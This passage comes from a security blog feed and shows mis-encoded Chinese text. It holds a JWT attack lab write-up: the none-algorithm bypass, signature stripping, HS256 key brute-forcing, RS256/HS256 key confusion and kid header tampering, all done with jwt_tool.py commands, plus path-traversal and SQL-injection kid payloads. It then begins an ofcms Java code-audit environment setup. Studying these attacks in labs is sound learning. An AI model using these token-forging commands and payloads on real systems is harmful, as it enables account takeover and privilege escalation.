src="/../images/jwt/image-20221022031706787.png" alt="image-20221022031706787"></a></p><p>æ›¿æ¢ä¸º â€œnoneâ€ ä»èƒ½æ­£å¸¸è®¿é—®ï¼Œç»•è¿‡äº†ç­¾åç®—æ³•ï¼Œå­˜åœ¨ â€œç©ºç®—æ³•éªŒè¯â€ æ¼æ´</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022032053932.png" data-caption="image-20221022032053932"><img src="/../images/jwt/image-20221022032053932.png" alt="image-20221022032053932"></a></p><p>å®æˆ˜ä¸­å¯ä¿®æ”¹ç¬¬äºŒéƒ¨åˆ†-æ¶ˆæ¯ä½“ï¼ˆpayloadï¼‰ä¸­çš„æ•°æ®ï¼Œé…åˆè¯¥æ¼æ´è¿›è¡Œæ”»å‡»ï¼Œå°†ç¬¬äºŒéƒ¨åˆ†çš„ â€œwoohooâ€ æ”¹ä¸º â€œadminâ€ï¼Œå€¼ä¸º <code>eyJuYW1lIjoiYWRtaW4ifQ</code> ,ç„¶å Burp æ”¾åŒ…</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022032851198.png" data-caption="image-20221022032851198"><img src="/../images/jwt/image-20221022032851198.png" alt="image-20221022032851198"></a></p><p>ä¿®æ”¹åç™»å½•ç”¨æˆ·æ›´æ”¹ä¸º â€œadminâ€</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022033129331.png" data-caption="image-20221022033129331"><img src="/../images/jwt/image-20221022033129331.png" alt="image-20221022033129331"></a></p><p>åŸå§‹ä¸º â€œwoohooâ€</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022033318882.png" data-caption="image-20221022033318882"><img src="/../images/jwt/image-20221022033318882.png" alt="image-20221022033318882"></a></p><h3 id="2ã€ä¸éªŒè¯ç­¾åå†…å®¹"><a href="#2ã€ä¸éªŒè¯ç­¾åå†…å®¹" class="headerlink" title="2ã€ä¸éªŒè¯ç­¾åå†…å®¹"></a>2ã€ä¸éªŒè¯ç­¾åå†…å®¹</h3><p>å¦‚æœæœåŠ¡ç«¯æ²¡æœ‰å¯¹ JWT ç­¾åéƒ¨åˆ†è¿›è¡Œæ ¡éªŒï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åˆ é™¤æœ€åçš„ç­¾åéƒ¨åˆ†ï¼Œä½¿æ ¼å¼å˜ä¸º <code>&#123;Header.Payload.&#125;</code>ï¼Œæ­¤æ—¶å¯ä»¥ä¿®æ”¹ <code>Payload</code> å†…å®¹ä¸ºå…¶ä»–ç”¨æˆ·ä¿¡æ¯ï¼Œä¼ªé€ ç”¨æˆ· token å€¼ã€‚è¿™é‡Œç›´æ¥åˆ©ç”¨ <code>jwt_tool.py</code> å·¥å…·è¿›è¡ŒéªŒè¯ï¼Œè‹¥è¯æ˜å­˜åœ¨æ¼æ´å†è‡ªè¡Œä¿®æ”¹ <code>payload</code> éƒ¨åˆ†è¿›è¡Œæµ‹è¯•ï¼Œä¹Ÿå¯ç›´æ¥åˆ æ‰ç¬¬ä¸‰éƒ¨åˆ†ï¼Œè‹¥ä¾ç„¶è¿”å›æ­£ç¡®çš„é¡µé¢åˆ™å­˜åœ¨æ¼æ´ï¼Œè¿™é‡Œæ²¡æœ‰å¿…è¦åˆ©ç”¨è¿™ä¸ªå·¥å…·å»æµ‹è¯•ï¼Œç›´æ¥åˆ æ‰ JWT å€¼ç¬¬ä¸‰éƒ¨åˆ†å†…å®¹å°±è¡Œï¼Œè¿™é‡Œä¸ºäº†å¼•å‡ºè¿™ä¸ªå·¥å…·ï¼Œå­å•¦ä¸€ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022055718503.png" data-caption="image-20221022055718503"><img src="/../images/jwt/image-20221022055718503.png" alt="image-20221022055718503"></a></p><h3 id="3ã€å¯†é’¥æ³„éœ²-amp-æš´åŠ›ç ´è§£å¯†é’¥"><a href="#3ã€å¯†é’¥æ³„éœ²-amp-æš´åŠ›ç ´è§£å¯†é’¥" class="headerlink" title="3ã€å¯†é’¥æ³„éœ²&amp;æš´åŠ›ç ´è§£å¯†é’¥"></a>3ã€å¯†é’¥æ³„éœ²&amp;æš´åŠ›ç ´è§£å¯†é’¥</h3><p>è‹¥JWTç­¾åä½¿ç”¨äº† â€œHMACâ€ ç®—æ³•ï¼ˆå¯¹ç§°åŠ å¯†ç®—æ³•ï¼‰ï¼Œåˆ™å¯å¯¹å…¶ Key è¿›è¡Œçˆ†ç ´ï¼Œè‹¥çˆ†ç ´å‡º key å€¼åˆ™å¯ä»¥ä¼ªé€ ç”¨æˆ· token å€¼è¿›è¡Œæ”»å‡»ã€‚æµ‹è¯•è¿‡ç¨‹ä¸­å¦‚æœå‘ç°å­˜åœ¨å¯†é’¥æ³„éœ²çš„æƒ…å†µä¸‹åˆ™å¯ç›´æ¥ä½¿ç”¨å·¥å…·é‡æ–°ç”Ÿæˆ JWT å€¼ï¼Œä¼ªé€ æ•°æ®ï¼Œè‹¥æ²¡æœ‰åˆ™éœ€è¦ä¾é å­—å…¸ï¼Œè‹¥ key å€¼ä¸ºå¼±å¯†é’¥åˆ™å¯è¿›è¡Œä¸‹ä¸€æ­¥æ”»å‡»ã€‚</p><p>è¿›å…¥ â€œWeak signatureâ€ é¶åœºï¼Œåˆ©ç”¨æ³¨å†Œè´¦å·ç™»å½•ï¼Œè·å–åˆ° challenge ä¸­çš„ JWT å€¼</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022060207246.png" data-caption="image-20221022060207246"><img src="/../images/jwt/image-20221022060207246.png" alt="image-20221022060207246"></a></p><p>é€šè¿‡è§£ç å¾—çŸ¥ä½¿ç”¨äº† â€œHS256â€ ç®—æ³•ï¼Œâ€HS256â€ ä¸º â€œHMACâ€ ç®—æ³•çš„å…¶ä¸­ä¸€ç§ï¼Œä¸ºå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œå³ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥å¯¹JWTè¿›è¡Œç­¾åå’Œè®¤è¯ï¼Œæ„å‘³ç€ä¹Ÿä¼šå¯¹ JWT è¿›è¡Œç­¾åçš„å¯†é’¥ä¹Ÿç”¨äºå¯¹å…¶è¿›è¡ŒéªŒè¯ï¼ˆæ³¨ï¼šå¯¹ç§°åŠ å¯†ç®—æ³•ä¸­ï¼Œæ•°æ®å‘ä¿¡æ–¹å°†æ˜æ–‡ï¼ˆåŸå§‹æ•°æ®ï¼‰å’ŒåŠ å¯†å¯†é’¥ä¸€èµ·ç»è¿‡ç‰¹æ®ŠåŠ å¯†ç®—æ³•å¤„ç†åï¼Œä½¿å…¶å˜æˆå¤æ‚çš„åŠ å¯†å¯†æ–‡å‘é€å‡ºå»ã€‚æ”¶ä¿¡æ–¹æ”¶åˆ°å¯†æ–‡åï¼Œè‹¥æƒ³è§£è¯»åŸæ–‡ï¼Œåˆ™éœ€è¦ä½¿ç”¨åŠ å¯†ç”¨è¿‡çš„å¯†é’¥åŠç›¸åŒç®—æ³•çš„é€†ç®—æ³•å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†ï¼Œæ‰èƒ½ä½¿å…¶æ¢å¤æˆå¯è¯»æ˜æ–‡ï¼‰</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022060336778.png" data-caption="image-20221022060336778"><img src="/../images/jwt/image-20221022060336778.png" alt="image-20221022060336778"></a></p><p>è¿™é‡Œä½¿ç”¨ jwt_tool.py å·¥å…·è¿›è¡Œæµ‹è¯• <code>python3 jwt_tool.py jwtå€¼</code>,é¦–å…ˆéªŒè¯æ˜¯å¦æ˜¯å¯ç ´è§£çš„å¯†é’¥ï¼Œå‘ç°æ˜¯ â€œHS256â€,å¯å°è¯•è¿›è¡Œ key çˆ†ç ´</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022061627075.png" data-caption="image-20221022061627075"><img src="/../images/jwt/image-20221022061627075.png" alt="image-20221022061627075"></a></p><p>çˆ†ç ´å¯†é’¥ <code>python3 jwt_tool.py jwtå€¼ -C -d wordlists.txt </code></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022062515948.png" data-caption="image-20221022062515948"><img src="/../images/jwt/image-20221022062515948.png" alt="image-20221022062515948"></a></p><p>åˆ©ç”¨çˆ†ç ´å‡ºæ¥çš„ key å€¼å¯¹ jwt è¿›è¡Œé‡æ–°ç­¾å</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022062806245.png" data-caption="image-20221022062806245"><img src="/../images/jwt/image-20221022062806245.png" alt="image-20221022062806245"></a></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022063014666.png" data-caption="image-20221022063014666"><img src="/../images/jwt/image-20221022063014666.png" alt="image-20221022063014666"></a></p><p>å°†ç”Ÿæˆçš„ jwt å€¼åˆ° Burp è¿›è¡Œé‡æ”¾</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022063145114.png" data-caption="image-20221022063145114"><img src="/../images/jwt/image-20221022063145114.png" alt="image-20221022063145114"></a></p><br/><h3 id="4ã€å¯†ç æ··æ·†æ”»å‡»"><a href="#4ã€å¯†ç æ··æ·†æ”»å‡»" class="headerlink" title="4ã€å¯†ç æ··æ·†æ”»å‡»"></a>4ã€å¯†ç æ··æ·†æ”»å‡»</h3><p>å½“ JWT ç­¾åç®—æ³•ä½¿ç”¨ â€œRSA â€œ åŠ å¯†ç®—æ³•æ—¶ï¼ŒRSA æ˜¯éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œéœ€è¦ä¸¤ä¸ªå¯†é’¥ï¼Œå…ˆç”¨ç§é’¥åŠ å¯†ç”Ÿæˆ JWT ï¼Œç„¶åä½¿ç”¨å…¶å¯¹åº”çš„å…¬é’¥æ¥è§£å¯†éªŒè¯ã€‚å³å‡è®¾æˆ‘ä»¬èƒ½å¤Ÿå°†ç­¾åç®—æ³•ä» â€œRS256â€ æ›´æ”¹ä¸º â€œHS256â€ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼ºåˆ¶åº”ç”¨ç¨‹åºä»…ä½¿ç”¨ä¸€ä¸ªå¯†é’¥æ¥å®ŒæˆåŠ å¯†å’Œè§£å¯†è¿™ä¸¤é¡¹ä»»åŠ¡ï¼Œæ­¤æ—¶æœåŠ¡ç«¯ä»£ç å°†ä½¿ç”¨å…¬é’¥ä½œä¸ºå¯†é’¥ï¼Œç„¶åä½¿ç”¨HS256ç®—æ³•éªŒè¯ç­¾åã€‚ï¼ˆæ³¨ï¼šéå¯¹ç§°åŠ å¯†ç®—æ³•éœ€è¦ä¸¤ä¸ªå¯†é’¥ï¼š å…¬å¼€å¯†é’¥ ï¼ˆpublickey:ç®€ç§°å…¬é’¥ï¼‰å’Œç§æœ‰å¯†é’¥ï¼ˆprivatekey:ç®€ç§°ç§é’¥ï¼‰ã€‚ å…¬é’¥ ä¸ ç§é’¥ æ˜¯ä¸€å¯¹ï¼Œå¦‚æœç”¨å…¬é’¥å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œåªæœ‰ç”¨å¯¹åº”çš„ç§é’¥æ‰èƒ½è§£å¯†ã€‚ å› ä¸ºåŠ å¯†å’Œ è§£å¯† ä½¿ç”¨çš„æ˜¯ä¸¤ä¸ªä¸åŒçš„å¯†é’¥ï¼Œæ‰€ä»¥è¿™ç§ç®—æ³•å«ä½œéå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚ï¼‰</p><p>è¿›å…¥ â€œExposed Keyâ€ é¶åœºï¼Œåˆ©ç”¨æ³¨å†Œè´¦å·ç™»å½•ï¼Œè·å–åˆ° challenge ä¸­çš„ JWT å€¼</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022064158310.png" data-caption="image-20221022064158310"><img src="/../images/jwt/image-20221022064158310.png" alt="image-20221022064158310"></a></p><p>é¶åœºå·²æä¾›äº†å…¬é’¥ä¿¡æ¯ â€œpublic keyâ€ï¼ˆå‡è£…é€šè¿‡æŠ€æœ¯æ‰‹æ®µè·å–åˆ°æ³„éœ²çš„å…¬é’¥ï¼‰ï¼Œå°†å…¶å¤åˆ¶ä¿å­˜ä¸ºæœ¬åœ°æ–‡ä»¶ <strong>public_key</strong> ï¼ˆæ³¨æ„ï¼šå…ˆå°†å…¬é’¥å¤åˆ¶åˆ° sublime åˆ æ‰å‰é¢çš„ç©ºæ ¼ï¼›æ–‡ä»¶æœ«å°¾è¿˜æœ‰ä¸€è¡Œç©ºè¡Œï¼›æ–‡ä»¶åæ²¡æœ‰åç¼€åï¼‰</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022064011276.png" data-caption="image-20221022064011276"><img src="/../images/jwt/image-20221022064011276.png" alt="image-20221022064011276"></a></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022071102736.png" data-caption="image-20221022071102736"><img src="/../images/jwt/image-20221022071102736.png" alt="image-20221022071102736"></a></p><p>è¿™æ¬¡å°±ä¸å»è§£ç äº†ï¼Œç›´æ¥åˆ©ç”¨ jwt_tool.py è¿›è¡Œä¿¡æ¯è·å–ï¼ŒåŠ å¯†æ–¹å¼ä¸º â€œRS256â€ ï¼Œç”¨æˆ·åä¸º â€œwoohooâ€</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022064328897.png" data-caption="image-20221022064328897"><img src="/../images/jwt/image-20221022064328897.png" alt="image-20221022064328897"></a></p><p>åˆ©ç”¨è·å–åˆ°çš„å…¬é’¥ä¿¡æ¯ï¼Œä½¿ç”¨ jwt_tool.py å·¥å…·ï¼Œå¯¹ JWT å€¼ä½¿ç”¨ â€œHS256â€ ç®—æ³•è¿›è¡Œç­¾å <code>python3 jwt_tool.py -X k -pk public_key jwtå€¼</code></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022071252972.png" data-caption="image-20221022071252972"><img src="/../images/jwt/image-20221022071252972.png" alt="image-20221022071252972"></a></p><p>å°†é‡æ–°ç”Ÿæˆçš„ JWT å€¼åˆ° Burp é‡æ”¾ï¼Œè‹¥è¿”å›å€¼ä¸ï¼ŒRS256 ç®—æ³•ç­¾åçš„ JWT å€¼ä¸€æ ·çš„é¡µé¢åˆ™è¯æ˜å­˜åœ¨æ¼æ´</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022071350414.png" data-caption="image-20221022071350414"><img src="/../images/jwt/image-20221022071350414.png" alt="image-20221022071350414"></a></p><p>è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œä¿®æ”¹ JWT ç¬¬äºŒéƒ¨åˆ†æ¶ˆæ¯ä½“(Payload)ï¼Œä¼ªé€  â€œadminâ€ ç”¨æˆ· token å€¼</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022071704133.png" data-caption="image-20221022071704133"><img src="/../images/jwt/image-20221022071704133.png" alt="image-20221022071704133"></a> </p><p><code>python3 jwt_tool.py -X k -pk public_key eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4ifQ==. </code></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022071937771.png" data-caption="image-20221022071937771"><img src="/../images/jwt/image-20221022071937771.png" alt="image-20221022071937771"></a></p><p>æˆåŠŸä¼ªé€  admin ç”¨æˆ·çš„ token è¿›è¡Œç™»å½•</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022071907390.png" data-caption="image-20221022071907390"><img src="/../images/jwt/image-20221022071907390.png" alt="image-20221022071907390"></a></p><h3 id="5ã€ç¯¡æ”¹-jwt-headerï¼ŒkidæŒ‡å®šæ”»å‡»"><a href="#5ã€ç¯¡æ”¹-jwt-headerï¼ŒkidæŒ‡å®šæ”»å‡»" class="headerlink" title="5ã€ç¯¡æ”¹ jwt headerï¼ŒkidæŒ‡å®šæ”»å‡»"></a>5ã€ç¯¡æ”¹ jwt headerï¼ŒkidæŒ‡å®šæ”»å‡»</h3><p>å¯†é’¥ ID (kid) æ˜¯Headerä¸­ä¸€ä¸ªå¯é€‰æ ‡å¤´ï¼Œå³ key IDï¼Œç”¨äºæŒ‡ç¤ºæ–‡ä»¶ç³»ç»Ÿæˆ–æ•°æ®åº“ä¸­å­˜åœ¨çš„ç‰¹å®šå¯†é’¥ï¼Œç„¶åä½¿ç”¨å…¶å†…å®¹æ¥éªŒè¯ç­¾å</p><p>è¿›å…¥ â€œVulnerable Kid â€œ é¶åœºï¼Œè¾“å…¥è´¦æˆ·å¯†ç è·å– JWT å€¼ã€‚è§£ç åï¼Œå¾—çŸ¥å­˜åœ¨ â€œkidâ€</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022225037179.png" data-caption="image-20221022225037179"><img src="/../images/jwt/image-20221022225037179.png" alt="image-20221022225037179"></a></p><p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ jwt_tool.py è¿›è¡Œè§£ç </p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022225206954.png" data-caption="image-20221022225206954"><img src="/../images/jwt/image-20221022225206954.png" alt="image-20221022225206954"></a></p><p>å°†kidå†…å®¹ä¿®æ”¹ä¸º â€œ&#x2F;dev&#x2F;nullâ€ ï¼Œå¹¶å°† Payload ä¸­ â€œnameâ€ ä¿®æ”¹ä¸º â€œadminâ€ ï¼Œç„¶åç”Ÿæˆæ–°çš„ token ã€‚<code>python3 jwt_tool.py jwtå€¼ -I -hc kid -hv &quot;/dev/null&quot; -pc name -pv &quot;admin&quot; -S hs256 </code></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022225653680.png" data-caption="image-20221022225653680"><img src="/../images/jwt/image-20221022225653680.png" alt="image-20221022225653680"></a></p><p>ç”Ÿæˆåçš„ JWT è§£ç åä¸º</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022230209305.png" data-caption="image-20221022230209305"><img src="/../images/jwt/image-20221022230209305.png" alt="image-20221022230209305"></a></p><p>æœ€åå°†ç”Ÿæˆçš„ token åˆ° Burp æ”¾åŒ…ï¼Œå®ç°ä¼ªé€  admin èº«ä»½</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022225519054.png" data-caption="image-20221022225519054"><img src="/../images/jwt/image-20221022225519054.png" alt="image-20221022225519054"></a></p><p>è‹¥ kid å€¼æ²¡æœ‰å­˜åœ¨è¿‡æ»¤ï¼Œæœ‰å¯èƒ½å­˜åœ¨å…¶å®ƒæ¼æ´ï¼Œå¦‚ï¼šä»»æ„æ–‡ä»¶è¯»å–ã€SQLæ³¨å…¥ã€å‘½ä»¤æ‰§è¡Œç­‰ï¼Œä¾‹å­å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line"> &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line"> &quot;kid&quot; : &quot;../../etc/passwd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><br/><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line"> &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line"> &quot;kid&quot; : &quot;admin&#x27; || union select &#x27;secretkey&#x27; -- &quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="äº”ã€æ€»ç»“"><a href="#äº”ã€æ€»ç»“" class="headerlink" title="äº”ã€æ€»ç»“"></a>äº”ã€æ€»ç»“</h2><p>ç»è¿‡å­¦ä¹ å‘ç°ï¼ŒJWT æ”»å‡»é¢å¤§å¤šä¸ºä¼ªé€ ä»¤ç‰Œä»è€Œæå‡æƒé™æˆ–å†’å……å…¶å®ƒç”¨æˆ·ï¼Œè¿›è€Œæ„å»ºä¸‹ä¸€æ­¥æ”»å‡»ã€‚æ€»ä½“ä¸Šæ”»å‡»ç‚¹è¿˜æ˜¯å–å†³äº JWT çš„åŠ å¯†æ–¹å¼ã€ç­¾åéªŒè¯ç­‰æ˜¯å¦å®‰å…¨ã€‚</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/225947</span><br><span class="line">https://mp.weixin.qq.com/s/BP33m2Z5LeNcU2owGTSM2Q</span><br><span class="line">https://mp.weixin.qq.com/s/puYElYPTz6zfEjND0jcm2g</span><br><span class="line">https://simplycalc.com/base64url-encode.php</span><br><span class="line">https://adamc95.medium.com/json-web-token-lab-guide-c402857fa44c</span><br><span class="line">https://jwt.io/</span><br><span class="line">https://base64.us/</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> WEBæ¼æ´ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´å­¦ä¹  </tag>
            
            <tag> JWTæ”»å‡» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaä»£ç å®¡è®¡(å››)-ofcms v1.1.3</title>
      <link href="/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/"/>
      <url>/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>è¯¥æ–‡ç« ç»“åˆäº†ä¹‹å‰å®¡è®¡æ—¶å­¦ä¹ åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œå‚è€ƒå·²æœ‰çš„æ–‡ç« ï¼Œè™½ç„¶è¯¥æºç åˆæ­¥å­¦ä¹ å®¡è®¡èµ·æ¥å¹¶ä¸ç®—å›°éš¾ï¼Œä½†è·ç¦»ç‹¬è‡ªå®¡è®¡è¿˜æœ‰ä¸€æ®µè·ç¦»ï¼Œè¯¥ CMS ä½œä¸ºå…¥é—¨å®¡è®¡é¡¹ç›®ï¼Œå¯¹æ–°æ‰‹è¿˜ç®—æ¯”è¾ƒå‹å¥½ã€‚å½“ç„¶è¯¥ CMS è¿˜æœ‰å…¶å®ƒæ¼æ´ç‚¹è¿˜æ²¡æœ‰è¿›è¡Œå®¡è®¡å­¦ä¹ ï¼Œåç»­æœ‰æ—¶é—´å†è¡¥å……ã€‚</p><h2 id="äºŒã€ç¯å¢ƒæ­å»º"><a href="#äºŒã€ç¯å¢ƒæ­å»º" class="headerlink" title="äºŒã€ç¯å¢ƒæ­å»º"></a>äºŒã€ç¯å¢ƒæ­å»º</h2><p>1ã€<a href="https://github.com/Funsiooo/Vuln_Bulid">å¯¼å…¥æºç </a>ï¼Œé‡æ–°åŠ è½½é¡¹ç›®ï¼Œæºç åœ°å€ï¼š</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230013447.png" data-caption="image-20221019230013447"><img src="/../images/Java/ofcms/image-20221019230013447.png" alt="image-20221019230013447"></a></p><p>é…ç½® Tomcat ç¯å¢ƒ</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230108972.png" data-caption="image-20221019230108972"><img src="/../images/Java/ofcms/image-20221019230108972.png" alt="image-20221019230108972"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230232755.png" data-caption="image-20221019230232755"><img src="/../images/Java/ofcms/image-20221019230232755.png" alt="image-20221019230232755"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230249450.png" data-caption="image-20221019230249450"><img src="/../images/Java/ofcms/image-20221019230249450.png" alt="image-20221019230249450"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230312244.png" data-caption="image-20221019230312244"><img src="/../images/Java/ofcms/image-20221019230312244.png" alt="image-20221019230312244"></a></p><p>ä¿®æ”¹æ•°æ®åº“è¿æ¥ç¯å¢ƒ <code>ofcms\ofcms-admin\src\main\resources\dev\conf\db-config.properties</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230547219.png" data-caption="image-20221019230547219"><img src="/../images/Java/ofcms/image-20221019230547219.png" alt="image-20221019230547219"></a></p><p><code>path</code> å¿…é¡»ä¿®æ”¹ä¸ºç³»ç»Ÿå¯è®¿é—®çš„è·¯å¾„ï¼Œç”±äºæˆ‘è‡ªå·±ç¯å¢ƒä¸ºè™šæ‹Ÿæœºï¼Œåªæœ‰Cç›˜ï¼Œæ‰€ä»¥å‡ºç°æŠ¥é”™ï¼Œè‹¥åœ¨çœŸå®ç¯å¢ƒä¸‹å¸¦dç›˜åˆ™ä¸ç”¨ç†ä¼š</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230724781.png" data-caption="image-20221019230724781"><img src="/../images/Java/ofcms/image-20221019230724781.png" alt="image-20221019230724781"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230853811.png" data-caption="image-20221019230853811"><img src="/../images/Java/ofcms/image-20221019230853811.png" alt="image-20221019230853811"></a></p><p>è¿è¡Œå¯åŠ¨ç¯å¢ƒï¼Œç‚¹å‡»å³ä¸Šè§’è¿è¡Œç¬¦å·å³å¯</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231020331.png" data-caption="image-20221019231020331"><img src="/../images/Java/ofcms/image-20221019231020331.png" alt="image-20221019231020331"></a></p><p>è¿è¡ŒæˆåŠŸåä¼šè‡ªåŠ¨å¼¹å‡ºå®‰è£…ç•Œé¢</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231045182.png" data-caption="image-20221019231045182"><img src="/../images/Java/ofcms/image-20221019231045182.png" alt="image-20221019231045182"></a></p><p>ç‚¹å‡»ä¸‹ä¸€æ­¥ä¼šå‡ºç°æŠ¥é”™ï¼Œéœ€è¦å°†è®¿é—®åœ°å€æ”¹ä¸º <code>http://æœ¬åœ°IP:ç«¯å£/é¡¹ç›®è·¯å¾„</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231159805.png" data-caption="image-20221019231159805"><img src="/../images/Java/ofcms/image-20221019231159805.png" alt="image-20221019231159805"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231216862.png" data-caption="image-20221019231216862"><img src="/../images/Java/ofcms/image-20221019231216862.png" alt="image-20221019231216862"></a></p><p>è¿™é‡Œçš„æ•°æ®åº“ç¯å¢ƒä¾æ—§ä½¿ç”¨phpstudy</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231304504.png" data-caption="image-20221019231304504"><img src="/../images/Java/ofcms/image-20221019231304504.png" alt="image-20221019231304504"></a></p><p>è¾“å…¥æ•°æ®åº“å¯†ç è¿›å…¥ä¸‹ä¸€æ­¥ï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªç©ºçš„ï¼Œåä¸º <code>ofcms</code> çš„æ•°æ®åº“</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231707919.png" data-caption="image-20221019231707919"><img src="/../images/Java/ofcms/image-20221019231707919.png" alt="image-20221019231707919"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231757207.png" data-caption="image-20221019231757207"><img src="/../images/Java/ofcms/image-20221019231757207.png" alt="image-20221019231757207"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231916420.png" data-caption="image-20221019231916420"><img src="/../images/Java/ofcms/image-20221019231916420.png" alt="image-20221019231916420"></a></p><p>æ¥ä¸‹æ¥å°±ç³»é‡ç‚¹äº†ï¼Œå°±æ˜¯è¿™ä¸ªæ— é™é‡è£…bugæäº†æˆ‘å¾ˆä¹…ï¼Œå› ä¸ºå¦‚æœæŒ‰ç…§æç¤ºé‡å¯webå®¹å™¨ï¼ˆidea runï¼‰ï¼Œä¾ç„¶ä¼šè¿›å…¥å®‰è£…ç•Œé¢</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232009809.png" data-caption="image-20221019232009809"><img src="/../images/Java/ofcms/image-20221019232009809.png" alt="image-20221019232009809"></a></p><p>è¿™é‡Œéœ€è¦ä¿®æ”¹æ•°æ®åº“è¿æ¥é…ç½®æ–‡ä»¶åï¼Œå°† <code>db-config</code> æ”¹ä¸º <code>db</code>,ä¹‹å‰å› ä¸ºè¿æ¥æ•°æ®åº“çš„ IP åœ°å€å¡«ä¸ºæœ¬åœ° IP åœ°å€ <code>192.x.x.x</code>ï¼Œè¿™æ ·ä¿®æ”¹ <code>db-config</code> ä¸º <code>db</code> 